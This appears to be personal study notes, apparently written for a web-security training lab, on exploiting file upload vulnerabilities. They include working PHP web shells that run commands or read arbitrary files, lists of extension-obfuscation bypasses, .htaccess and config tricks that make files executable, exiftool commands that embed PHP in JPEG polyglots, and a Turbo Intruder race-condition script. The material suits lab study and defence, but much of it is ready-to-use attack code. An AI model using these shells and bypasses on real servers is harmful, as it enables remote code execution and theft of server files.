# File upload vulnerabilities  
## Web shell
The worst scenario is when server accepts php files and executes them.
In such case we can create shel or read arbitrary files:    
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
Execute command:
```
<?php echo system($_GET['command']); ?>
GET /example/exploit.php?command=id HTTP/1.1
```

## Flawed file type validation
Sometimes servers are checking not real filetype of uploaded file, but only Content-Type header in the request. So wee can upload arbitrary file and hide it behind Content-Type: image/jpeg.  

## Preventing file execution in user-accessible directories
Sometimes directories where we are uploading scripts have some restrictions and we won't be able to execute our script after uplaoding it.  
But we can try to upload it to another directory (by changing filename in multipart/form-data for example)  
We can uplaod script to ../ directory (or ..%2F)  

## Blacklisting file extensions  
If server blacklists .php files, we can try to use less common files that are able t oexecute code (.php5, .shtml etc)  
Also sometimes servers sue config files which we potentially would be able to modify. If we are able to uplaod custom config files such as:
```
/etc/apache2/apache2.conf
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php

web.config
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```
We would be able to disable file restrictions and upload and execute our shells.  
We can modify .htaccess file to map some extensions as php files:
```
AddType application/x-httpd-php .l33t
```

## Obfuscation
We can bypass restrictions via file extension obfuscation:
```
.pHp
exploit.php.jpg
exploit.php.
exploit.asp;.jpg
exploit.asp%00.jpg
url-encoding and double-encoding
exploit%2Ephp
multibyte unicode characters which could be converted to null bytes and dots
xC0 x2E
xC4 xAE
xC0 xAE

```

## Flawed validation of file contents
Some servers check file contents, not only their extension or content-type. To bypass this we can try to add some fingerprint to our exploit (for example JPEG always starts with bytes FF D8 FF).  
Also with tools such as ExifTools we can create JPEG file containing malicious code.  
```
exiftool -DocumentName="<h1>letmein<?php echo file_get_contents('/home/carlos/secret'); ?><h1>" image.jpg
OR
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

## File uplaod via race condition  
Race condition appears when server gets some file into filesystem and keeps it for some time (couple of seconds) before removing it or placing in some another place  
We can access file during this small time. This vulnerability is hvery hard to detect  
For such goals we can use turbo Intruder wwith next script (based on single-packet race condition):
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
This will send 5 GET requests following our POST request. Even if files are handled correctly, but they are kept for some second on server, we are able to execute code.  
We can extend time during which time file is proceeded on server uploading large files.  

## File upload without RCE
If we can't expoloit server-side, we can create attacks on user. If we are able uplaod HTML or SVG files, we potentially create stored XSS.  

## Exploiting via PUT  
Even if server doesn't seem to have uplaod function but supports PUT method, we can try to PUT exploit manually to some location  
We can check this possibility with help of OPTIONS request  
